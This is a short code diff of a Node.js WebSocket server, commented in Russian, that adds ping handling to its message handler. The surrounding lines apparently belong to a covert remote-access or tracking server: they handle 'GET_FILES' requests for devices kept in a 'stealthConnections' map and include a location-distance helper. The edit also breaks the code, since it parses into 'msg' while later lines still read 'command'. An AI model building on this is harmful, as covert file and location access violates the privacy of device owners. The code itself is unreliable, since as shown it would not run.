@@ -132,8 +132,15 @@ wss.on("connection", (ws, req) => {
 
     // Обработка команд от веб-клиента
     ws.on("message", (rawData) => {
-      try {
-        const command = JSON.parse(rawData.toString());
+  try {
+    const dataStr = rawData.toString();
+    const msg = JSON.parse(dataStr);
+    
+    // Игнорируем ping
+    if (msg.type === 'ping') {
+      console.log(`Ping from ${deviceId}`);
+      return;
+    }
         
         if (command.action === 'GET_FILES' && command.deviceId) {
           const deviceInfo = stealthConnections.get(command.deviceId);
@@ -410,4 +417,5 @@ function getDistance(lat1, lon1, lat2, lon2) {
 server.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
 });
+
 
